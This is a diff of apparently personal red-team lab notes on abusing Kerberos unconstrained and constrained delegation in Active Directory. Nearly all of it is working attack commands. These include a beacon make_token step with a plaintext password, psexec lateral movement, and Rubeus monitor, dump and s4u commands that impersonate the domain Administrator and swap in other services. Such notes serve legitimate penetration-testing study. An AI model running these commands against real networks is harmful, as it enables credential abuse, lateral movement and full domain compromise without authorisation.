@@ -7,6 +7,9 @@ ldapsearch (&(samAccountType=805306369 (userAccountControl:1.2.840.113556.1.4.80
 
 Within SYSTEM level beacon on Unconstrained Delegation host, monitor for incoming TGTs on host
 ```powershell
+make_token CONTOSO\rsteel Passw0rd!
+jump psexec64 lon-ws-1 smb
+
 execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /nowrap
 ```
 
@@ -51,14 +54,13 @@ Within SYSTEM level beacon on Constrained Delegation host, dump TGT for the comp
 execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x3e7  /service:krbtgt /nowrap
 ```
 
-Perform the S4U abuse to obtain a usable service ticket for **a service listed in the `msDS-AllowedToDelegateTo`** value, impersonating the default domain admin.
+Perform the S4U abuse to obtain a usable service ticket for **a service listed in the `msDS-AllowedToDelegateTo`** value, impersonating the default domain admin. `/altservice` too
 ```powershell
 execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:LON-WKSTN-1$ /msdsspn:ldap/lon-dc-1 /impersonateuser:Administrator /nowrap /ticket:
-```
 
-With Service Name Substitution **/altservice**
-```powershell
-execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:LON-WKSTN-1$ /msdsspn:ldap/lon-dc-1 /impersonateuser:Administrator /nowrap /altservice:cifs,http /ticket:
+
+
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:lon-ws-1$ /msdsspn:time/lon-dc-1 /altservice:cifs /impersonateuser:Administrator /nowrap /ticket:
 ```
 
  Inject the ticket into a sacrificial logon session.
